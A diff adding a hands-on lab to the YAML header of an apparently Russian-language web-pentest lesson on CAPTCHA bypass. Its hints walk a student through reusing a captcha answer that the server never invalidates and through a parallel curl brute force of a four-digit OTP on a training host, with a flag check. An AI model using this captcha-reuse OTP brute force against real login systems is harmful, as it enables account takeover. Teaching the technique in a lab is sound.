@@ -13,6 +13,18 @@ useful_for:
   - "Пентест веб-приложений"
 estimated_minutes: 40
 summary: "Обход CAPTCHA и защиты от автоматизации: удаление параметра, reuse ответа, OCR/ферма, race и обход rate-limit."
+lab:
+  kind: shell
+  title: 'Практика: обход CAPTCHA через reuse ответа'
+  toolset: [core, curl]
+  workdir: /home/student/task
+  files: [task.md]
+  check: 'grep -q ''nto{'' found.txt'
+  hints:
+    - 'Получи капчу: `curl -s https://shop.local/captcha/new` — вернёт `captcha_id`.'
+    - 'Реши её один раз правильным ответом — сервер запомнит пару `captcha_id`/ответ.'
+    - 'Сервер НЕ помечает `captcha_id` использованным: тот же ответ можно переиспользовать.'
+    - 'Переиспользуй капчу для burst-перебора OTP: `curl -s --parallel ''https://shop.local/login/otp?captcha_id=c_88f1&captcha=4f7k2&otp=0000..9999&burst=100'' | tail -1 > found.txt`, затем `check`.'
 ---
 
 ## Вопрос, с которого всё начинается
